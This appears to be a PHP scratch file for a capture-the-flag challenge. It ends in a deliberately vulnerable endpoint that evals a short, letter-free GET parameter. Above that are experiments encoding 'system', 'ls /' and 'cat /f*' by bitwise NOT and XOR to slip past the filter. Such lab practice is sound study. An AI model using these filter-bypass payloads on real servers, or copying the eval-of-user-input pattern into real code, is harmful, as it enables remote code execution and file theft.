<?php
echo ~'system';
error_log(urlencode(~'system'));
echo urlencode(~'system');
error_log(urlencode(~'ls /'));
error_log(urlencode(~'cat /f*'));
// echo $_=_.\x18\x1a\x0b^____; 
// $__ = ~%9c%9e%8b;
// echo $__;
// echo ~'wn';
// echo ~'我';
// @eval("$_=~~'_GET';$__=$$_${$_}[_](${$_}[__]);");
// $_="{{{{"^"$<>/";
// $__=$$_;
// @eval('$__[_];');
// $c = ~"_GET";
// echo ~$c;
// $payload = '
// $_ = "­  ­­";
// $__ = "";
// $___ = "system(id);".($_ ^ $__);
// $___;';
// $payload = '$_="­­­"^"";echo $_;';
// echo $payload;
// echo "<p>eval: ", @eval($payload), "</p>";
// echo "ls"." -a";
echo '--------------------------------';
echo "<p>🐱: ", $🐱=$_GET['(#°д°)'], "</p>";
echo "<p>strlen", strlen($🐱=$_GET['(#°д°)']) < 0x20, "</p>";
echo "<p>!preg_match", !preg_match('/[a-z0-9`]/i',$🐱), "</p>";
echo "<p>eval: ", @eval($🐱), "</p>";
?>

<?=


highlight_file(__FILE__)
&& strlen($🐱=$_GET['(#°д°)']) < 0x20
&& !preg_match('/[a-z0-9`]/i',$🐱)
&& @eval($🐱);


